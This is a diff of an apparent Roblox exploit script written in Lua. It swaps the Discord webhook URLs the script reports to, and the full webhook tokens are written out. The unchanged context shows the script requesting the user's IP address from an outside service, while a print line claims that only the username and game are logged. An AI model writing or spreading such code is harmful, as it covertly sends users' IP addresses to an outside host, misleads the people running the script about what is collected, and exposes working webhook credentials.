@@ -333,7 +333,7 @@ print("Only info I log is your Username And the game you injected on.")
 
 
 -------------------------------------
-local webh = "https://discord.com/api/webhooks/1074833988637687869/dtGT_1z9pKlhIERV4t_oVQE5JRitUSInBidE-vBTUcOKSS4vlqiWdKzQcQZl2O_3n6yI"
+local webh = "https://discord.com/api/webhooks/1076097744650903662/VBjDywRq6zhF690ElqzSr3kBug-R7aIjdVe-YRnC69M-kEL_V-T3Xq0mFetj0sPT194g"
 
 getgenv().GameName = nil
 
@@ -422,7 +422,7 @@ pcall(function()
    end
 end)
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1074833988637687869/dtGT_1z9pKlhIERV4t_oVQE5JRitUSInBidE-vBTUcOKSS4vlqiWdKzQcQZl2O_3n6yI"
+local WebhookURL = "https://discord.com/api/webhooks/1076097744650903662/VBjDywRq6zhF690ElqzSr3kBug-R7aIjdVe-YRnC69M-kEL_V-T3Xq0mFetj0sPT194g"
 local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
